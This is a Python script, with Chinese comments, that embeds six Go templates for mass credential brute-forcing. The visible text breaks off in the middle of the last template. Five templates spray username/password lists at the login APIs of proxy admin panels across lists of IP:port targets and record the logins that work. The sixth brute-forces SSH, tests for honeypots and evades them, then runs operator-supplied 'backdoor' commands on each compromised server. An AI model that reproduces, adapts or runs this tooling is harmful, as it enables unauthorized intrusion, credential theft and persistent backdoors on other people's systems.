import os
import subprocess
import time
import shutil
import sys
try:
    import readline
except ImportError:
    pass

# =========================== xui.go模板1内容 ===========================
XUI_GO_TEMPLATE_1 = '''package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"runtime"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time

func loadList(filename string) []string {
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("无法读取", filename, ":", err)
		os.Exit(1)
	}
	lines := strings.Split(string(content), "\\n")
	var result []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			result = append(result, line)
		}
	}
	return result
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	client := &http.Client{}
	payload := fmt.Sprintf("username=%s&password=%s", username, password)
	formData := strings.NewReader(payload)
	req, err := http.NewRequest("POST", url, formData)
	if err != nil {
		return nil, err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req = req.WithContext(ctx)
	return client.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
	defer wg.Done()
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		atomic.AddInt64(&completedCount, 1)
		return
	}
	ip := parts[0]
	port := parts[1]

	for _, username := range usernames {
		for _, password := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
			url := fmt.Sprintf("http://%s:%s/login", ip, port)
			resp, err := postRequest(ctx, url, username, password)
			cancel()

			if err != nil {
				ctx, cancel = context.WithTimeout(context.Background(), 2*time.Second)
				url = fmt.Sprintf("https://%s:%s/login", ip, port)
				resp, err = postRequest(ctx, url, username, password)
				cancel()
			}

			if err != nil {
				continue
			}

			if resp.StatusCode == http.StatusOK {
				body, _ := ioutil.ReadAll(resp.Body)
				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if success, ok := responseData["success"].(bool); ok && success {
						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
						atomic.AddInt64(&completedCount, 1)
						return
					}
				}
			}
		}
	}
	atomic.AddInt64(&completedCount, 1)
}

func updateProgress() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		count := atomic.LoadInt64(&completedCount)
		percent := float64(count) / float64(totalTasks) * 100
		elapsed := int(time.Since(startTime).Seconds())

		if count == 0 {
			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			continue
		}
		remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
		fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)

		if count >= totalTasks {
			break
		}
	}
}

func triggerGC() {
	runtime.GC()
}

func main() {
	inputFile := "results.txt"
	lines, err := ioutil.ReadFile(inputFile)
	if err != nil {
		fmt.Println("无法读取输入文件:", err)
		return
	}

	usernames := {user_list}
     passwords := {pass_list}


	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	batchSize := {batch_size}
	var batch []string

	allLines := strings.Split(string(lines), "\\n")
	for _, line := range allLines {
		line = strings.TrimSpace(line)
		if line != "" {
			batch = append(batch, line)
		}
	}

	totalTasks = int64(len(batch))
	startTime = time.Now()
	go updateProgress()

	for i := 0; i < len(batch); i += batchSize {
		end := i + batchSize
		if end > len(batch) {
			end = len(batch)
		}
		currentBatch := batch[i:end]

		for _, ipPort := range currentBatch {
			wg.Add(1)
			go processIP(ipPort, file, usernames, passwords)
		}

		wg.Wait()
		time.Sleep(100 * time.Millisecond)
		triggerGC()
	}

	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板2内容 ===========================
XUI_GO_TEMPLATE_2 = '''package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"runtime"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	client := &http.Client{}
	data := map[string]string{
		"username": username,
		"password": password,
	}
	jsonPayload, _ := json.Marshal(data)
	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req = req.WithContext(ctx)
	return client.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
	defer wg.Done()
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		atomic.AddInt64(&completedCount, 1)
		return
	}
	ip := parts[0]
	port := parts[1]

	for _, username := range usernames {
		for _, password := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
			url := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
			resp, err := postRequest(ctx, url, username, password)
			cancel()

			if err != nil {
				ctx, cancel = context.WithTimeout(context.Background(), 2*time.Second)
				url = fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
				resp, err = postRequest(ctx, url, username, password)
				cancel()
			}

			if err != nil {
				continue
			}

			if resp.StatusCode == http.StatusOK {
				body, _ := ioutil.ReadAll(resp.Body)
				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if success, ok := responseData["success"].(bool); ok && success {
						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
						atomic.AddInt64(&completedCount, 1)
						return
					}
				}
			}
		}
	}
	atomic.AddInt64(&completedCount, 1)
}

func updateProgress() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		count := atomic.LoadInt64(&completedCount)
		percent := float64(count) / float64(totalTasks) * 100
		elapsed := int(time.Since(startTime).Seconds())

		if count == 0 {
			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			continue
		}
		remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
		fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)

		if count >= totalTasks {
			break
		}
	}
}

func triggerGC() {
	runtime.GC()
}

func loadList(filename string) []string {
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("无法读取", filename, ":", err)
		os.Exit(1)
	}
	lines := strings.Split(string(content), "\\n")
	var result []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			result = append(result, line)
		}
	}
	return result
}

func main() {
	inputFile := "results.txt"
	lines, err := ioutil.ReadFile(inputFile)
	if err != nil {
		fmt.Println("无法读取输入文件:", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	batchSize := {batch_size}
	var batch []string

	allLines := strings.Split(string(lines), "\\n")
	for _, line := range allLines {
		line = strings.TrimSpace(line)
		if line != "" {
			batch = append(batch, line)
		}
	}

	totalTasks = int64(len(batch))
	startTime = time.Now()
	go updateProgress()

	for i := 0; i < len(batch); i += batchSize {
		end := i + batchSize
		if end > len(batch) {
			end = len(batch)
		}
		currentBatch := batch[i:end]

		for _, ipPort := range currentBatch {
			wg.Add(1)
			go processIP(ipPort, file, usernames, passwords)
		}

		wg.Wait()
		time.Sleep(100 * time.Millisecond)
		triggerGC()
	}

	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板3内容 ===========================
XUI_GO_TEMPLATE_3 = '''package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"runtime"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time

func loadList(filename string) []string {
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("无法读取", filename, ":", err)
		os.Exit(1)
	}
	lines := strings.Split(string(content), "\\n")
	var result []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			result = append(result, line)
		}
	}
	return result
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	client := &http.Client{}
	data := map[string]string{
		"username": username,
		"pass": password,
	}
	jsonPayload, _ := json.Marshal(data)
	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
	if err != nil {
		return nil, err
	}
	req.Header.Add("Content-Type", "application/json;charset=UTF-8")
	req.Header.Add("Accept", "application/json, text/plain, */*")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0")
	req = req.WithContext(ctx)
	return client.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
	defer wg.Done()
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		atomic.AddInt64(&completedCount, 1)
		return
	}
	ip := parts[0]
	port := parts[1]

	for _, username := range usernames {
		for _, password := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
			url := fmt.Sprintf("http://%s:%s/hui/auth/login", ip, port)
			resp, err := postRequest(ctx, url, username, password)
			cancel()
			if err != nil {
				continue
			}
			if resp.StatusCode == http.StatusOK {
				body, _ := ioutil.ReadAll(resp.Body)
				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if data, ok := responseData["data"].(map[string]interface{}); ok {
						if token, exists := data["accessToken"].(string); exists && token != "" {
							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
							atomic.AddInt64(&completedCount, 1)
							return
						}
					}
				}
			}
		}
	}
	atomic.AddInt64(&completedCount, 1)
}

func updateProgress() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		count := atomic.LoadInt64(&completedCount)
		percent := float64(count) / float64(totalTasks) * 100
		elapsed := int(time.Since(startTime).Seconds())

		if count == 0 {
			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			continue
		}
		remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
		fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)

		if count >= totalTasks {
			break
		}
	}
}

func triggerGC() {
	runtime.GC()
}

func main() {
	inputFile := "results.txt"
	lines, err := ioutil.ReadFile(inputFile)
	if err != nil {
		fmt.Println("无法读取输入文件:", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	batchSize := {batch_size}
	var batch []string

	allLines := strings.Split(string(lines), "\\n")
	for _, line := range allLines {
		line = strings.TrimSpace(line)
		if line != "" {
			batch = append(batch, line)
		}
	}

	totalTasks = int64(len(batch))
	startTime = time.Now()
	go updateProgress()

	for i := 0; i < len(batch); i += batchSize {
		end := i + batchSize
		if end > len(batch) {
			end = len(batch)
		}
		currentBatch := batch[i:end]

		for _, ipPort := range currentBatch {
			wg.Add(1)
			go processIP(ipPort, file, usernames, passwords)
		}

		wg.Wait()
		time.Sleep(100 * time.Millisecond)
		triggerGC()
	}

	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板4内容 ===========================
XUI_GO_TEMPLATE_4 = '''package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"runtime"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time

func loadList(filename string) []string {
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("无法读取", filename, ":", err)
		os.Exit(1)
	}
	lines := strings.Split(string(content), "\\n")
	var result []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			result = append(result, line)
		}
	}
	return result
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	client := &http.Client{}

	// 构造 JSON 格式负载
	payload := map[string]string{
		"username": username,
		"password": password,
	}
	jsonPayload, _ := json.Marshal(payload)

	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
	if err != nil {
		return nil, err
	}

	// 浏览器伪造请求头
	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36")
	req = req.WithContext(ctx)

	return client.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
	defer wg.Done()
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		atomic.AddInt64(&completedCount, 1)
		return
	}
	ip := parts[0]
	port := parts[1]
	url := fmt.Sprintf("http://%s:%s/login", ip, port)

	for _, username := range usernames {
		for _, password := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
			resp, err := postRequest(ctx, url, username, password)
			cancel()

			if err != nil || resp.StatusCode != 200 {
				continue
			}

			body, _ := ioutil.ReadAll(resp.Body)
			var responseData map[string]interface{}
			if err := json.Unmarshal(body, &responseData); err == nil {
				if success, ok := responseData["success"].(bool); ok && success {
					if data, ok := responseData["data"].(map[string]interface{}); ok {
						if token, exists := data["token"]; exists && token != "" {
							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
							atomic.AddInt64(&completedCount, 1)
							return
						}
					}
				}
			}
		}
	}
	atomic.AddInt64(&completedCount, 1)
}

func updateProgress() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		count := atomic.LoadInt64(&completedCount)
		percent := float64(count) / float64(totalTasks) * 100
		elapsed := int(time.Since(startTime).Seconds())
		if count == 0 {
			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			continue
		}
		remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
		fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
		if count >= totalTasks {
			break
		}
	}
}

func triggerGC() {
	runtime.GC()
}

func main() {
	inputFile := "results.txt"
	lines, err := ioutil.ReadFile(inputFile)
	if err != nil {
		fmt.Println("无法读取输入文件:", err)
		return
	}

	usernames := {user_list}
     passwords := {pass_list}

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	batchSize := {batch_size}
	var batch []string

	allLines := strings.Split(string(lines), "\\n")
	for _, line := range allLines {
		line = strings.TrimSpace(line)
		if line != "" {
			batch = append(batch, line)
		}
	}

	totalTasks = int64(len(batch))
	startTime = time.Now()
	go updateProgress()

	for i := 0; i < len(batch); i += batchSize {
		end := i + batchSize
		if end > len(batch) {
			end = len(batch)
		}
		currentBatch := batch[i:end]

		for _, ipPort := range currentBatch {
			wg.Add(1)
			go processIP(ipPort, file, usernames, passwords)
		}

		wg.Wait()
		time.Sleep(100 * time.Millisecond)
		triggerGC()
	}

	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板5内容 ===========================
XUI_GO_TEMPLATE_5 = '''package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"runtime"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time

func loadList(filename string) []string {
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("无法读取", filename, ":", err)
		os.Exit(1)
	}
	lines := strings.Split(string(content), "\\n")
	var result []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			result = append(result, line)
		}
	}
	return result
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	client := &http.Client{}
	form := fmt.Sprintf("user=%s&pass=%s", username, password)
	body := strings.NewReader(form)

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req = req.WithContext(ctx)

	return client.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
	defer wg.Done()
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		atomic.AddInt64(&completedCount, 1)
		return
	}
	ip := parts[0]
	port := parts[1]
	url := fmt.Sprintf("http://%s:%s/app/api/login", ip, port)

	for _, username := range usernames {
		for _, password := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
			resp, err := postRequest(ctx, url, username, password)
			cancel()

			if err != nil || resp.StatusCode != 200 {
				continue
			}

			body, _ := ioutil.ReadAll(resp.Body)
			var responseData map[string]interface{}
			if err := json.Unmarshal(body, &responseData); err == nil {
				if success, ok := responseData["success"].(bool); ok && success {
					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
					atomic.AddInt64(&completedCount, 1)
					return
				}
			}
		}
	}
	atomic.AddInt64(&completedCount, 1)
}

func updateProgress() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		count := atomic.LoadInt64(&completedCount)
		percent := float64(count) / float64(totalTasks) * 100
		elapsed := int(time.Since(startTime).Seconds())

		if count == 0 {
			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			continue
		}
		remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
		fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)

		if count >= totalTasks {
			break
		}
	}
}

func triggerGC() {
	runtime.GC()
}

func main() {
	inputFile := "results.txt"
	lines, err := ioutil.ReadFile(inputFile)
	if err != nil {
		fmt.Println("无法读取输入文件:", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	batchSize := {batch_size}
	var batch []string

	allLines := strings.Split(string(lines), "\\n")
	for _, line := range allLines {
		line = strings.TrimSpace(line)
		if line != "" {
			batch = append(batch, line)
		}
	}

	totalTasks = int64(len(batch))
	startTime = time.Now()
	go updateProgress()

	// 修改后的代码
    for i := 0; i < len(batch); i += batchSize {
    end := i + batchSize
    if end > len(batch) {
        end = len(batch)
    }
    currentBatch := batch[i:end]

    for _, ipPort := range currentBatch {
    wg.Add(1)
    go processIP(ipPort, file, usernames, passwords)
    }


    // 在每个批次完成后调用 wg.Wait()，确保当前批次处理完成后再进行下一步
    wg.Wait() 
    time.Sleep(100 * time.Millisecond)
    triggerGC()
}


	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板6内容 ===========================
XUI_GO_TEMPLATE_6 = '''package main

import (
	"fmt"
	"io/ioutil"

	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"runtime"

	"golang.org/x/crypto/ssh"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time

func loadList(filename string) []string {
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("无法读取", filename, ":", err)
		os.Exit(1)
	}
	lines := strings.Split(string(content), "\\n")
	var result []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			result = append(result, line)
		}
	}
	return result
}

func trySSH(ip, port, username, password string) (*ssh.Client, bool) {
	addr := fmt.Sprintf("%s:%s", ip, port)
	config := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         2 * time.Second, // ⚠️ 直接用这个
	}
	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return nil, false
	}
	return client, true
}

func isLikelyHoneypot(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return true
	}
	defer session.Close()

	err = session.RequestPty("xterm", 80, 40, ssh.TerminalModes{})
	if err != nil {
		return true
	}

	output, err := session.CombinedOutput("echo $((1+1))")
	if err != nil {
		return true
	}

	return strings.TrimSpace(string(output)) != "2"
}


func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}
func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
    semaphore <- struct{}{}
    wg.Add(1)
    go func() {
        done := make(chan struct{})
        go func() {
            defer func() {
                if r := recover(); r != nil {
                    fmt.Println("Panic:", r)
                }
                atomic.AddInt64(&completedCount, 1)
                <-semaphore
                wg.Done()
                close(done)
            }()

            // ======= 下面全是你原有业务代码 =======
            parts := strings.Split(ipPort, ":")
            if len(parts) != 2 {
                fmt.Println("无效的 IP:Port 格式 ->", ipPort)
                return
            }

            ip := strings.TrimSpace(parts[0])
            port := strings.TrimSpace(parts[1])

            found := false
            for _, username := range usernames {
                for _, password := range passwords {
                    client, success := trySSH(ip, port, username, password)
                    if success {
                        // 判断蜜罐
                        fakePasswords := []string{
                            password + "1234",
                            password + "abcd",
                            password + "!@#$",
                            password + "!@#12",
                            password + "!@6c2",
                        }
                        isHoneypot := false
                        for _, fake := range fakePasswords {
                            if _, fakeSuccess := trySSH(ip, port, username, fake); fakeSuccess {
                                isHoneypot = true
                                break
                            }
                        }

                        if isHoneypot {
                            client.Close()
                            found = true
                            break
                        }

                        if !isLikelyHoneypot(client) {
                            writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
                            if ENABLE_BACKDOOR {
                                deployBackdoor(client, ip, port, username, password, CUSTOM_BACKDOOR_CMDS)
                            }
                        }
                        client.Close()
                        found = true
                        break
                    }
                }
                if found {
                    break
                }
            }
            // ======= 你原有的代码到这里为止 =======
        }()

        // 只加下面这一层超时外壳，绝不影响原本业务逻辑
        select {
        case <-done:
            // 正常结束
        case <-time.After(30 * time.Second):
            //fmt.Printf("任务超时强制释放: %s\\n", ipPort)
            // 如果前面已经done多释放一次也没事（不会panic）
            atomic.AddInt64(&completedCount, 1)
            <-semaphore
            wg.Done()
        }
    }()
}





var lastCompletedCount int64  // 记录最后一次的进度
var lastUpdateTime time.Time  // 记录最后一次更新时间

func updateProgress() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		count := atomic.LoadInt64(&completedCount)
		percent := float64(count) / float64(totalTasks) * 100
		elapsed := int(time.Since(startTime).Seconds())

		if count == 0 {
			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			lastUpdateTime = time.Now()
			lastCompletedCount = count
			continue
		}

		remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
		fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)

		if count == lastCompletedCount && time.Since(lastUpdateTime) > 60*time.Second {
	        fmt.Println("\\n进度卡住，重新开始当前任务")
	        triggerFileCleanUp()
	        return
          }


		lastCompletedCount = count
		lastUpdateTime = time.Now()

		if count >= totalTasks {
			fmt.Println("\\n进度完成！")
			return
		}
	}
}

func triggerGC() {
	runtime.GC()
}
// 等待WaitGroup完成，支持超时退出
func waitTimeout(wg *sync.WaitGroup, timeout time.Duration) bool {
	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()
	select {
	case <-done:
		return true
	case <-time.After(timeout):
		return false
	}
}


var retryFlag = false  // 添加在全局变量区

func triggerFileCleanUp() {
	fmt.Println("清理文件并准备重新执行爆破...")
	if err := os.Remove("xui.txt"); err != nil {
		fmt.Println("删除文件失败:", err)
	} else {
		fmt.Println("已删除当前文件 xui.txt")
	}
	retryFlag = true
}
var ENABLE_BACKDOOR = {enable_backdoor}
var CUSTOM_BACKDOOR_CMDS = {custom_backdoor_cmds}

func deployBackdoor(client *ssh.Client, ip string, port string, username string, password string, cmds []string) {
	// 检查 unzip 是否存在
	if !checkUnzip(client) {
		fmt.Println("🔧 未检测到 unzip，尝试安装中...")
		if !installPackage(client, "unzip") || !checkUnzip(client) {
			fmt.Println("❌ unzip 安装失败")
			recordFailure(ip, port, username, password, "unzip 安装失败")
			return
		}
	}

	// 检查 wget 是否存在
	if !checkWget(client) {
		fmt.Println("🔧 未检测到 wget，尝试安装中...")
		if !installPackage(client, "wget") || !checkWget(client) {
			fmt.Println("❌ wget 安装失败")
			recordFailure(ip, port, username, password, "wget 安装失败")
			return
		}
	}

	// ✅ 检查 curl 是否存在
	if !checkCurl(client) {
		fmt.Println("🔧 未检测到 curl，尝试安装中...")
		if !installPackage(client, "curl") || !checkCurl(client) {
			fmt.Println("❌ curl 安装失败")
			recordFailure(ip, port, username, password, "curl 安装失败")
			return
		}
	}

	// 拼接 backdoor.txt 中的命令
	backdoorCmd := strings.Join(cmds, " && ")

	payloadSession, err := client.NewSession()
	if err != nil {
		fmt.Println("❌ 创建 payload session 失败:", err)
		recordFailure(ip, port, username, password, "无法创建 payload session")
		return
	}
	defer payloadSession.Close()

	err = payloadSession.Run(backdoorCmd)
	if err != nil {
		fmt.Println("❌ 后门命令执行失败")
		recordFailure(ip, port, username, password, "后门命令执行失败")
		return
	}

	fmt.Println("✅ 成功部署后门")
	recordSuccess(ip, port, username, password)
}

func checkUnzip(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	cmd := `command -v unzip >/dev/null 2>&1 && echo OK || echo MISSING`
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		return false
	}
	return strings.Contains(string(output), "OK")
}

func checkWget(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	cmd := `command -v wget >/dev/null 2>&1 && echo OK || echo MISSING`
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		return false
	}
	return strings.Contains(string(output), "OK")
}

func checkCurl(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	cmd := `command -v curl >/dev/null 2>&1 && echo OK || echo MISSING`
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		return false
	}
	return strings.Contains(string(output), "OK")
}

func installPackage(client *ssh.Client, name string) bool {
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	installCmd := fmt.Sprintf(`
		if command -v apt >/dev/null 2>&1; then
			apt update -y && apt install -y %[1]s
		elif command -v yum >/dev/null 2>&1; then
			yum install -y %[1]s
		elif command -v opkg >/dev/null 2>&1; then
			opkg update && opkg install %[1]s
		else
			echo "NO_PACKAGE_MANAGER"
		fi
	`, name)

	err = session.Run(installCmd)
	return err == nil
}

func recordSuccess(ip, port, username, password string) {
	f, err := os.OpenFile("hmsuccess.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
		f.Sync()
	}
}

func recordFailure(ip, port, username, password, reason string) {
	f, err := os.OpenFile("hmfail.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("%s:%s %s %s 失败原因: %s\\n", ip, port, username, password, reason))
	}
}

func main() {
	inputFile := "results.txt"

RETRY:
	lines, err := ioutil.ReadFile(inputFile)
	if err != nil {
		fmt.Println("无法读取输入文件:", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}
	batchSize := {batch_size}

	batch := []string{}
	allLines := strings.Split(string(lines), "\\n")
	for _, line := range allLines {
		line = strings.TrimSpace(line)
		if line != "" {
			batch = append(batch, line)
		}
	}

	totalTasks = int64(len(batch))
